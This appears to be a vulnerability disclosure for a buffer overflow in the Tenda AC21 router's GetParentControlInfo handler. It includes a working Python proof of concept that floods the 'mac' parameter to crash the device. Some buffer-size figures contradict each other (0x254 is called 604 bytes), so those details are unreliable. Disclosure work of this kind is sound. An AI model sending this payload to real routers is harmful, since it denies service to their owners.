# Stack-Based Buffer Overflow in Tenda Wi-Fi 5 Router AC21（AC21V1.0re_V16.03.08.16）
## Overview
There is a stack-based buffer overflow vulnerability in the Tenda Wi-Fi 5 Router AC21 device running the firmware version AC21V1.0re_V16.03.08.16. Due to the lack of restrictions on certain parameters in the GetParentControlInfo function and the absence of boundary checks, a stack overflow may occur. Unauthenticated remote attackers can execute a Denial of Service (DoS) attack through the parameters in this endpoint: `/goform/GetParentControlInfo` `sub_433BE4` `formDefineTendDa`

## Vulnerability Details
+ **Vendor**: Shenzhen Jixiang Tenda Technology Co., Ltd. ([https://www.tenda.com.cn](https://www.tenda.com.cn))
+ **Vulnerability Type**: Stack-Based Buffer Overflow (CWE-121)
+ **Affected Product**: Tenda Wi-Fi 5 Router AC21 device
+ **Affected Version**: AC21V1.0re_V16.03.08.16
+ **Attack Vector**: Exploit functions without boundary checks and with insufficient parameter restrictions, using carefully constructed payloads to cause a stack-based buffer overflow
+ **Impact**:
    - Denial of Service (Dos)
+ **Affected Component**: /goform/GetParentControlInfo, sub_433BE4, formDefineTendDa
+ **CVE ID**: Pending (CVE application in progress)
+ **Discovered by**: xxricardoxkk (xxricardoxkk@gmail.com)
+ **Firmware**: [https://www.tenda.com.cn/material/show/3742](https://www.tenda.com.cn/material/show/3742)

## Discovery
This vulnerability was discovered by analyzing the firmware (US_AC21V1.0re_V16.03.08.16_cn_TDC01.bin). The following call chain exists in the squashfs-root/bin/httpd file:  
main → sub_433BE4 → formDefineTendDa → GetParentControlInfo

![](https://github.com/XXRicardo/iot-cve/blob/main/Tenda/AC21/image/main%E8%B0%83%E7%94%A8.png)

![](https://github.com/XXRicardo/iot-cve/blob/main/Tenda/AC21/image/formDefineTenda1.png)

![](https://github.com/XXRicardo/iot-cve/blob/main/Tenda/AC21/image/formDefineTenda2.png)

s is a buffer allocated via malloc(0x254u), with a size of 0x254 bytes and initialized to all 0s. The target address is s + 2, meaning data copying starts from the 3rd byte of s, and the remaining available space is 604 - 2 = 602 bytes. Var is the external input obtained via websGetVar(a1, "mac", &unk_4D999C) (it is the value of the user-controllable "mac" parameter). strcpy will continuously copy characters from Var until encountering \0, without verifying at all whether the target buffer can accommodate all the data. As external input, the length of Var may exceed 602 bytes.

![](https://github.com/XXRicardo/iot-cve/blob/main/Tenda/AC21/image/%E6%BA%A2%E5%87%BA%E7%82%B9.png)

Therefore, carefully designing a payload at the interface path /goform/GetParentControlInfo can cause a buffer overflow.

## Steps to Reproduce
Construct the following payload using python:

```python
import requests

# Construct overflow payload
def create_payload():
    buffer_size = 512000
    payload = b"A" * buffer_size
    v11_value = b"\xef\xbe\xad\xde"
    payload += v11_value
    return payload

# Construct and send HTTP request
def send_payload(url, payload):
    params = {'mac': payload}
    response = requests.get(url, params=params)
    response = requests.get(url, params=params)
    response = requests.get(url, params=params)
    response = requests.get(url, params=params)
    print("Response status code:", response.status_code)
    print("Response body:", response.text)

if __name__ == "__main__":
    # Target URL
    url = "http://192.168.190.239/goform/GetParentControlInfo"
    # Create malicious payload
    payload = create_payload()
    # Send malicious request
    send_payload(url, payload)
```

Use qemu to emulate the httpd extracted from US_AC21V1.0re_V16.03.08.16_cn_TDC01.bin (note that this file is for the mips little-endian architecture, and IDA needs to be used to modify httpd to adapt to the emulation environment).

![](https://github.com/XXRicardo/iot-cve/blob/main/Tenda/AC21/image/patch.png)

As shown in the figure below, the emulation is successful.

![](https://github.com/XXRicardo/iot-cve/blob/main/Tenda/AC21/image/payload%24%E4%BB%BF%E7%9C%9F.png)

Use this script to trigger the stack overflow.

![](https://github.com/XXRicardo/iot-cve/blob/main/Tenda/AC21/image/%E8%A7%A6%E5%8F%91.png)

#### Impact
Unauthenticated remote attackers can execute a Denial of Service (DoS) attack through the parameters in this endpoint. 
